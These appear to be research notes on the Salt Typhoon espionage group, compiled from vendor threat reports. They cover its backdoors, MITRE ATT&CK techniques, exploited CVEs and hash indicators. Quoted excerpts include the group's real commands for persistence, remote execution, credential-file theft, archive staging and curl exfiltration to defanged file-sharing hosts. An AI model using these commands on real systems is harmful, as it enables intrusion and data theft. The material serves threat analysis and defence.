# SOURCES TO READ
https://www.darkreading.com/application-security/salt-typhoon-malware-arsenal-ghostspider
https://attack.mitre.org/software/S1206/
https://attack.mitre.org/software/S1206/
https://www.picussecurity.com/resource/blog/salt-typhoon-telecommunications-threat
https://cyberscoop.com/salt-typhoon-us-telecom-hack-earth-estries-trend-micro-report/
https://www.rapid7.com/research/report/salt-typhoon-apt-china-mss/
https://thehackernews.com/2024/11/chinese-hackers-use-ghostspider-malware.html
https://www.trendmicro.com/en_us/research/24/k/earth-estries.html
https://www.sygnia.co/blog/ghost-emperor-demodex-rootkit/


# TOOLS
## GHOSTSPIDER
### Summary
WIP

### Excerpts
* Excerpt 1 \
So, I can enact a specific module to do one specific thing, and it only does that one thing, and then if I need something else, I enact another module. And this does make it much more difficult for defenders and researchers to identify what's what," Clay says, because one instance of GhostSpider might look entirely different from another. \
The newly discovered GhostSpider, meanwhile, is a highly modular backdoor, adjustable for any particular attack scenario, according to Jon Clay, Trend Micro's vice president of threat intelligence.
* Excerpt 2 \
Among Salt Typhoon’s arsenal is the advanced "GhostSpider" backdoor malware, specifically engineered to infiltrate telecommunications networks [2]. This tool provides persistent access to compromised systems, enabling prolonged surveillance and data extraction
* Excerpt 3 \
This advanced tool enables persistent access to compromised systems, supporting long-term espionage operations targeting telecommunications networks worldwide, as detailed in [6].
* Excerpt 4 \
In 2024, the Chinese state-sponsored hacking group Salt Typhoon launched a global campaign targeting telecommunications service providers. Utilizing their custom-developed backdoor malware, GhostSpider, the group gained persistent access to compromised systems, enabling prolonged espionage activities within critical telecommunications networks.
* Excerpt 5 \
GhostSpider backdoor, which can load different modules based on the attackers' specific purposes.

## Masol RAT
### Summary

### Excerpts
* Excerpt 1 \
There's Masol RAT — a cross-platform tool it's used against Linux servers from Southeast Asian governments

## SnappyBee
### Summary

### Excerpts
* Excerpt 1 \
the modular SnappyBee (aka Deed RAT)

## Demodex
### Excerpts
* Excerpt 1 \
the group also possesses a rootkit called Demodex

# SALT TYPHOON Overview
## Summary

## Excerpts on views
* Excerpt 1 \
According to the researchers, it is a structured organization of distinct, specialized teams. Its various backdoors, for example, are managed by different "infrastructure teams." The tactics, techniques, and procedures (TTPs) utilized in different attacks might vary significantly, with unique teams focusing in different geographic regions and industries — another reason why pinning down the Chinese APT has been so difficult over the years. "They are very sophisticated [at] gaining access, maintaining access, maintaining persistence, and wiping their tracks when they have done something to make it look like they were never there," Clay says.
* Excerpt 2 \
"In the past, they were doing a lot of phishing of employees," Clay recalls. "Now they're targeting Internet-facing devices using n-day vulnerabilities, finding any open ports [or] protocols, or applications that are running that they can exploit in order to gain access."

# Attack Methods
## MITRE ATT&CK
### Summary

### Excerpts
* Excerpt 1 \
Exploit Public-Facing Application - MITRE T1190 \
As mentioned earlier, initial access is primarily achieved by exploiting vulnerabilities in exposed public-facing endpoints, enabling the deployment of malicious payloads through known flaws in web servers and applications. \
* Excerpt 2 \
Command and Scripting Interpreter - MITRE T1059 \
Salt Typhoon uses command and scripting interpreters to execute malicious scripts and commands on compromised systems. This technique is crucial for deploying additional payloads and maintaining control over infected hosts. \
For instance, security researchers have identified a case where the group exploited vulnerable or misconfigured QConvergeConsole installations on a target server to gain system access [5]. The remote application agent installed on the server (located at c:\program files\qlogic corporation\nqagent\netqlremote.exe) was used for network discovery and to deploy Cobalt Strike on the compromised machine.
* Excerpt 3
```
Modify Registry - MITRE T1112

To maintain persistence, Salt Typhoon modifies system processes or creates new ones that run malicious code. This ensures that their malware remains active even after system reboots.

For instance, Crowdoor backdoor malware used by Salt Typhoon establishes persistence through a combination of registry modifications and service creation. When no argument or argument "0" is passed during execution, Crowdoor adds an entry to the Windows registry Run key using commands like [5]:

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v malicious-registry-name /t REG_SZ /d "C:\path\to\malicious-crowdoor.exe" /f
Create or Modify System Process: Windows Service - MITRE T1543.003

Alternatively, it can create a new service with commands such as:

sc create Crowdoor binPath= "C:\path\to\malicious-crowdoor.exe" start= auto

Both methods ensure the backdoor is executed automatically on system reboot.

For stealth, Crowdoor employs process injection to execute itself within the context of a legitimate process, such as msiexec.exe. When argument "1" is used, the malware invokes process injection, leveraging system calls like CreateRemoteThread or NtCreateThreadEx to inject malicious payloads into the memory space of msiexec.exe. This enables execution without leaving significant artifacts on the disk.

Crowdoor's main functions are controlled by additional arguments passed during execution [5]. For instance:

    Argument "2" initiates the backdoor's primary operations, such as communication with its command-and-control (C2) server via encrypted channels.
    Other specific Command IDs (e.g., 0x11736212) are mapped to tasks such as file manipulation, directory creation, or remote shell access, as listed in its functionality table.

These techniques, combined with its ability to dynamically switch between different operational modes based on provided arguments, make Crowdoor a robust persistence tool.
```
* Excerpt 4
```
Exploitation for Privilege Escalation - MITRE T1068

The group exploits vulnerabilities in external-facing services like Microsoft Exchange servers and QConvergeConsole installations. Exploited services are used to deploy tools such as Cobalt Strike and PsExec, providing initial access to high-privilege accounts or systems.

(For command examples, see the “Command and Scripting Interpreter” section of the blog).
```
* Excerpt 5
```
Valid Accounts - MITRE T1078

Tools like TrillClient are employed to harvest sensitive credentials from browser caches and other storage areas. Extracted credentials are often used to impersonate privileged users, such as domain admins, facilitating further escalation.
Create or Modify System Process: Windows Service - MITRE T1053.005

The attackers use commands to create malicious services that execute payloads with elevated privileges. For example:

sc create VGAuthtools binpath= "Installutil[.]exe C:\ProgramData\VMware\vmvssrv.exe" start= auto

This command launches a malicious loader that deploys high-privilege tools such as Cobalt Strike.
Scheduled Task/Job: Scheduled Task - MITRE T1053.005

Salt Typhoon performed scheduled tasks by remotely creating scheduled tasks using tools like WMIC to execute commands or payloads with system-level privileges.

For instance, they used the following command:

wmic /node:<IP> /user:<domain>\<user> /password:***** process call create "schtasks /run /tn microsoft\sihost"

It connects to a remote machine (/node:<IP>) using specified credentials (/user and /password) and creates a scheduled task named microsoft\sihost. This task is configured to execute with system-level privileges, allowing the attackers to run malicious payloads or commands seamlessly. By leveraging WMIC and scheduled tasks, Salt Typhoon could integrate malicious activities into routine system processes, making detection and analysis more challenging.
```
* Excerpt 6
```
Hijack Execution Flow: DLL Side-Loading - T1574.002

They utilized DLL sideloading by exploiting legitimate processes like MsSecEs.exe to load malicious DLLs such as Zingdoor and Snappybee. This allowed them to evade detection by blending into normal system operations.

In addition, they implemented other alternative ways to load payloads, such as:

    Using rundll32.exe to execute DLLs.
    Loading encrypted payloads via executable loaders like vmtools.exe:

C:\\Windows\\system32\\cmd.exe /C sc create VMware binpath= \"rundll32.exe C:\\Progra~1\\VMware\\vmtools.dll,fjdpw03d\" start= auto displayname= \"VMware\"
```
* Excerpt 7
```
Obfuscated Files or Information - MITRE T1027

They used various encryption methods, including multi-layer XOR and Base64 encoding with custom alphabets, to hide the malicious payloads in tools like Cobalt Strike. This made static analysis by defenders more challenging.
Obfuscated Files or Information: Indicator Removal from Tools - MITRE T1027.005

Earth Estries (a.k.a Salt Typhoon) employs a sophisticated tactic of obfuscating files and removing indicators by frequently uninstalling older backdoor versions and replacing them with updated variants. This strategy falls under Indicator Removal from Tools, which aims to minimize the likelihood of detection and forensic analysis.

For example, tools such as Crowdoor and Cobalt Strike are periodically cleaned up and replaced, either through automated scripts or manual intervention.

By cycling through updated versions, Earth Estries reduces the digital footprint of its operations while adapting to changes in the target's defensive measures. This technique also helps the group evade behavioral detection systems that may rely on recognizing specific patterns or artifacts left by earlier tools. Through this method, Earth Estries maintains operational security and persistence, making it harder for defenders to attribute and neutralize their activities.
```
* Excerpt 8
```
Remote Services - MITRE T1021

The threat actor uses remote services to move laterally within a network. By leveraging valid account credentials that they harvested during their presence within the compromised network, Salt Typhoon can access remote systems and spread their malware across the network, increasing their foothold and potential impact [13].
```

* Excerpt 9
```
OS Credential Dumping: NTDS - MITRE T1003.003

Salt Typhoon employed a new variant of the NinjaCopy tool to bypass security mechanisms and extract sensitive system files. NinjaCopy uses a low-level NTFS parser, bypassing Windows protections like the System Access Control List (SACL) and Discretionary Access Control Lists (DACLs), enabling the group to extract files such as the NTDS.dit and SYSTEM registry hives. These files contain critical data like hashed credentials, which are vital for further exploitation within the victim's environment.

This modified variant of NinjaCopy, based on an open-source NTFS parser by Velocidex, allows attackers to open read handles on protected NTFS volumes, enabling unauthorized access to files locked by the system or used exclusively by other processes. By targeting these files, Earth Estries extracted sensitive configuration and credential data from their victims.
Data from Local System - MITRE T1005

The group organized their collected data into password-protected RAR archives before exfiltration. They used the following command to archive and secure sensitive files [5]:

rar a -m3 -inul -ed -r -s -hp{password} -ta{yyyymmdd} -n*.pdf -n*.ddf -x*"\{avoided path}\" {Collector Path}\out<n>.tmp \\{IP}\"{Target Path}"

Salt Typhoon employed predefined passwords like:

takehaya
foreverthegod
dh2uiwqji9dash

These archives often contained documents, system logs, and sensitive browser data collected from user directories.
Exfiltration Over C2 Channel - MITRE T1041

After data collection, Earth Estries exfiltrated the stolen archives via command-and-control (C2) channels, using tools like cURL to upload files to anonymized file-sharing services.

Commands for exfiltration included:

curl -F "file=@c:\windows\ime\out1.tmp" hxxps://api.anonfiles[.]com/upload
curl -F "file=@c:\windows\ime\out1.tmp" -k hxxps:/file[.]io
curl -F "file=@c:\windows\ime\out3.tmp" hxxps://api.anonfiles[.]com/upload

These actions anonymized their operations, making detection and traceability challenging for defenders. Additionally, Earth Estries leveraged internal proxy servers to disguise outbound traffic, forwarding data from compromised machines to external C2 servers. This tactic ensured exfiltration efforts appeared as routine network activity within the victim's environment.
```

* Excerpt 10
```
Proxy: Internal Proxy - MITRE T1090.001

Salt Typhoon utilized advanced command-and-control techniques to obfuscate malicious activity. Notably, their backdoors, such as Zingdoor, were configured to route communication through internal proxy servers within the victim’s network. This method masked malicious traffic by blending it with legitimate internal communication, making detection significantly more challenging.

By leveraging the internal proxy infrastructure, Salt Typhoon redirected backdoor traffic to external command-and-control (C2) servers through multiple proxy layers. This approach not only concealed the true destination of the data but also reduced the likelihood of detection by anomaly-based monitoring systems or intrusion detection tools. Consequently, the attackers effectively evaded network security controls and prolonged their presence within the compromised environment.


SHA256 Hashes of Malware Used by Salt Typhoon

    CD2B703E1B7CFD6C552406F44EC05480209003789AD4FBBA4D4CFFD4F104B0A0
    0EAA67FE81CEC0A41CD42866DF1223CB7D2B5659AB295DFFE64FE9C3B76720AA
    E6F9756613345FD01BBCF28EBA15D52705EF4D144C275B8CFE868A5D28C24140
    C7023183E815B9AFF68D3EBA6C2CA105DBE0A9B05CD209908DCEE907A64CE80B
    1A9E0C7C88E7A8B065EC88809187F67D920E7845350D94098645E592EC5534F6
    EFB98B8F882AC84332E7DFDC996A081D1C5E6189AD726F8F8AFEC5D36A20A730
    8476AD68CE54B458217AB165D66A899D764EAE3AD30196F35D2FF20D3F398523
    DFF1D282E754F378EF00FB6EBE9944FEE6607D9EE24EC3CA643DA27F27520AC3
    42D4EB7F04111631891379C5CCE55480D2D9D2EF8FEAF1075E1AED0C52DF4BB9
    45B9204CCBAD92E4E5FB9E31AAB683EB5221EB5F5688B1AAE98D9C0F1C920227
    98E250BC06DE38050FDEAB9B1E2EF7E4D8C401B33FD5478F3B85197112858F4E
    B1BC10FA25A4FD5AE7948C6523EB975BE8D0F52D1572C57A7EF736134B996586
    49A0349DFA79B211FC2C5753A9B87F8CD2E9A42E55ECA6F350F30C60DE2866CE
    71A503B5B6EC8321346BEE3F6129AF0B8AD490A36092488D085085CDC0FC6B9D
    28109C650DF5481C3997B720BF8CE09E7472D9CDB3F02DD844783FD2B1400C72
    A8DD0CA6151000DE33335F48A832D24412DE13CE05EA6F279BF4AAAA2E5AAECB
    DEAA3143814C6FE9279E8BC0706DF22D63EF197AF980D8FEAE9A8468F441EFEC
    B6481E0EDC36A0472AB0CE7D0817F1773C4AF9307AE60890A667930558A762FF
    EEB3D2E87D343B2ACF6BC8E4E4122D76A9AD200AE52340C61E537A80666705ED
    4B014891DF3348A76750563AE10B70721E028381F3964930D2DD49B9597FFAC3
    2531891691EF674345F098EF18B274091ACDF3F2808CCA753674599C043CCD7D
    C59E17806E3A58792F07662B4985119252C8221688084D20B599699BFDB272D8
    E1A7E5F27362AAF0D12B58B96A816EF61A2A498DEF9805297AA81F6F83729230
    CA6713BEDBD19C2AD560700B41774825615B0FE80BF61751177FFBC26C77AA30
    CDADAD8D7CED1370BAA5D1FFE435BED78C2D58ED4CDA364B8A7484E3C7CDAC98
    82F3384723B21F9A928029BB3EE116F9ADBC4F7EC66D5A856E817C3DC16D149D
    415E0893CE227464FB29D76E0500C518935D11379D17FB14EFFAEF82E962FF76
    F6223D956DF81DCB6135C6CE00EE14D0EFEDE9FB399B56D2EE95B7B0538FE12C
    23DEA3A74E3FF6A367754D02466DB4C86FFDA47EFE09529D3AAD52B0D5694B30
    25B9FDEF3061C7DFEA744830774CA0E289DBA7C14BE85F0D4695D382763B409B
    2B5E7B17FC6E684FF026DF3241AF4A651FC2B55CA62F8F1F7E34AC8303DB9A31
    44EA2E85EA6CFFBA66F5928768C1EE401F3A6D6CD2A04E0D681D695F93CC5A1F
    6D64643C044FE534DBB2C1158409138FCDED757E550C6F79EADA15E69A7865BC
    8DF9FA495892FC3D183917162746EF8FD9E438FF0D639264236DB553B09629DC
    B63C82FC37F0E9C586D07B96D70FF802D4B707FFB2D59146CF7D7BB922C52E7E

SHA1 Hashes of Malware Used by Salt Typhoon

    23E228D5603B4802398B2E7419187AEF71FF9DD5
    2560B7E28B322BB7A56D0B1DA1B2652E1EFE76EA
    311D1D50673FBFC40B84D94239CD4FA784269465
    3650899C669986E5F4363FDBD6CF5B78A6FCD484
    4DF896624695EA2780552E9EA3C40661DC84EFC8
    76C430B55F180A85F4E1A1E40E4A2EA37DB97599
    7C809B4866086EF7FB1AB722F94DF5AF493B80DB
    873F98CAF234C3A8A9DB18343DAD7B42117E85D4
    B9601E60F87545441BF8579B2F62668C56507F4A
    BB2F5B573AC7A761015DAAD0B7FF03B294DC60F6
    C36ECD2E0F38294E1290F4B9B36F602167E33614
    E2B0851E2E281CC7BCA3D6D9B2FA0C4B7AC5A02B
    FDC44057E87D7C350E6DF84BB72541236A770BA2

MD5 Hashes of Malware Used by Salt Typhoon

    012862165EC105A44FEA14FACE53492F
    0A7390A687F949D0A3CDF2926449018B
    0B9AE998423A207F021F8E61B93BC849
    0BBFBA106FBB9E310330DC87C32CB6D1
    103E4C2E4EE558D130C8B59BFD66B4FB
    145FF08E736693D522F8A09C8D3405D6
    149A9E24DBE347C4AF2DE8D135AA4B76
    18BE25AB5592329858965BEDFCC105AF
    1BC301AA9B861F762CE5F376228E992A
    1DD03936BAF0FE95B7E5B54A9DD4A577
    24E9870973CEA42E6FAF705B14208E52
    27C558BD42744CDDC9EDB3FA597D0510
    2B8EE4D70B8A47EB98B63AEDD543EBA4
    2C7EBD103514018BAD223F25026D4DB3
    2DD0885F84B890883A396030DB841D28
    3B7721715B2842CDFF0AB72BD605A0CE
    3F15C4431AD4573344AD56E8384EBD62
    42097A09CD3420FD7168BA1AFC84939E
    475AA86AE60C640EEC4FDEA93B5ED04D
    48E9CDFF28E944A6B1A20214CBBC126F
    4F950683F333F5ED779D70EB38CDADCF
    6685323C61D8EDB4A6E35796AF34D626
    6A44FDD66AB841C33949620666CA847A
    7394229455151A9CD036383027A1536B
    78B47DDA664545542ED3ABE17400C354
    7A162C26D56B0C55E6CD81CD953F510B
    868B8A5012E0EB9A48D2DAF7CB7A5D87
    8A900F742D0E3CD3898F37DBC3D6E054
    96F5312281777E9CC912D5B2D09E6132
    A213873EB55DC092DDF3ADBEB242BD44
    BE38D173E4E9118BDC2E83FD5F90BE3B
    C10643B3FB304972C650E593B69FAAA1
    DD7593E9BA80502505C958B9BBBF2838
    E0D9215F64805E0BFF03F4DC796FE52E
    E845563BA35E8D227152165B0C3E769F
    F078AC9B012C503D35254AF9629D3B67
    F4A30F84EB754A21B4D200300A4C7ABB
    FCA94B8B718357143C53620C6B360470
    FD8382EFB0A16225896D584DA56C182C
```
## CVEs
### Summary

### Excerpts
* Excerpt 1 \
"N-day" refers to recently disclosed bugs that organizations might not have had a chance to patch yet. The group's favorite vulnerabilities have been dangerous (but now well-documented), including: \
    The SQL injection bug CVE-2024-48788, which affects the Fortinet Enterprise Management Server (EMS) \
    CVE-2022-3236, a code injection issue in Sophos Firewalls \
    CVE-2023-46805 and CVE-2024-21887, which pair to allow privileged, arbitrary command execution in Ivanti's Connect Secure VPN \
    The four Microsoft Exchange vulnerabilities involved in ProxyLogon

* Excerpt 2 \
Salt Typhoon's operations are marked by the use of advanced malware and the exploitation of both known and zero-day vulnerabilities, showcasing the resources and expertise typically associated with nation-state actors. This group has demonstrated a consistent ability to exploit public-facing endpoints, targeting vulnerabilities that allow for initial access and long-term persistence. \
Notably, the following CVEs have been exploited by Salt Typhoon in their campaigns: \
    CVE-2023-46805, CVE-2024-21887 (Ivanti Connect Secure VPN) \
    CVE-2023-48788 (Fortinet FortiClient EMS) \
    CVE-2022-3236 (Sophos Firewall) \
    CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, CVE-2021-27065 (Microsoft Exchange – ProxyLogon) \
In addition, the group's affiliation with China is further supported by the use of tools and techniques consistent with other known Chinese APT groups [4].

* Excerpt 3 \
Here are the some of known vulnerabilities with CVE IDs that are known to be exploited by the Salt Typhoon group [6]: \
    CVE-2023-48788 (Fortinet FortiClient EMS) \
    CVE-2022-3236 (Sophos Firewall) \
    CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, CVE-2021-27065 (Microsoft Exchange – ProxyLogon) \
    CVE-2023-46805, CVE-2024-21887 (Ivanti Connect Secure VPN) \
Note that patches are already available for these vulnerabilities, some of which date back to 2021. This highlights the importance of timely adaptation in exposure management processes.

## Unidentified Attack Methods
### Summary

### Excerpts
* Excerpt 1 \
Salt Typhoon, also known as Earth Estries, FamousSparrow, GhostEmperor, and UNC2286, is a critical actor in the global cyber threat landscape. Renowned for its sophisticated cyber espionage campaigns, the group primarily targets the telecommunications, government, and technology sectors.  Strongly linked to state-sponsored initiatives, particularly from China [1], Salt Typhoon’s operations go beyond intelligence gathering. By targeting critical infrastructure and key industries, the group advances geopolitical objectives, exerting strategic pressure on adversaries. This dual role of espionage and influence underscores its pivotal role in shaping international relations through digital means.
* Excerpt 2 \
Salt Typhoon is a prominent threat actor that has garnered significant attention in the cybersecurity community due to its sophisticated operations and strategic targeting. This group, which is believed to be state-sponsored by China, has been active since at least 2023, according to [3].
* Excerpt 3 \
The group's targeting has also evolved, with a notable shift towards more strategic targets that can yield high-value intelligence. This includes not only telecommunications but also government entities and technology firms, which are often at the forefront of innovation and possess critical data.
* Excerpt 4 \
Notably, Salt Typhoon breached major U.S. broadband providers [7], including Verizon, AT&T, and Lumen Technologies, potentially exposing sensitive communications data, such as information from federal wiretapping systems [8], posing significant national security risks on government and corporate activities.
* Excerpt 5 \
Their attack methods include exploiting vulnerabilities in public-facing endpoints such as VPNs, firewalls, and exchange servers to gain initial access [9]. They have also been observed using spear-phishing emails to deliver malware payloads.
* Excerpt 6 \
Their operations are characterized by stealth and persistence, often remaining undetected for extended periods. The breaches resulted in significant data exposure, with potential implications for national security and corporate confidentiality.

# Commands
## Summary
## Excerpts
* Excerpt 1
```
The following commands are written and executed by Salt Typhoon.

# Retrieves domain admin group details:

C:\Windows\system32\cmd.exe /C net group "domain admins" /domain

# Copies malicious payload to the target:
C:\Windows\system32\cmd.exe /C copy C:\users\public\music\go4.cab \\{HostName}\c$\programdata\microsoft\drm

# Extracts the payload on the target:

C:\Windows\system32\cmd.exe /C expand -f:* \\{HostName}\c$\programdata\microsoft\drm\go4.cab \\{HostName}\c$\programdata\microsoft\drm

# Execute malicious script remotely:
C:\Windows\system32\cmd.exe /C c:\users\public\music\PsExec.exe -accepteula \\172.16.xx.xx "c:\ProgramData\Microsoft\DRM\g2.bat"

In a separate case, the group exploited a vulnerability in Apache Tomcat 6, included with QConvergeConsole (c:\program files (x86)\qlogic corporation\qconvergeconsole\tomcat-x64\apache-tomcat-6.0.35\bin\tomcat6.exe), to facilitate lateral movement and execute later-stage tools [5].

# Executes a batch script (182.bat) on a remote system using the WMIC

C:\Windows\system32\cmd.exe /C wmic /node:172.16.xx.xx process call create "cmd.exe /c c:\ProgramData\Microsoft\DRM\182.bat"

# Employs rar.exe to compress sensitive files, specifically PDFs, into an archive. By collecting files from the temp directory and compressing them into a single .rar archive with maximum compression, Salt Typhoon staged the data for exfiltration.

C:\Windows\system32\cmd.exe /C

C:\Users\Public\Music\rar.exe a -m5

C:\Users\Public\Music\pdf0412.rar

C:\Users\Public\Music\temp\*.pdf

These actions demonstrate a structured approach to lateral movement and data staging, critical steps in their attack chain.
```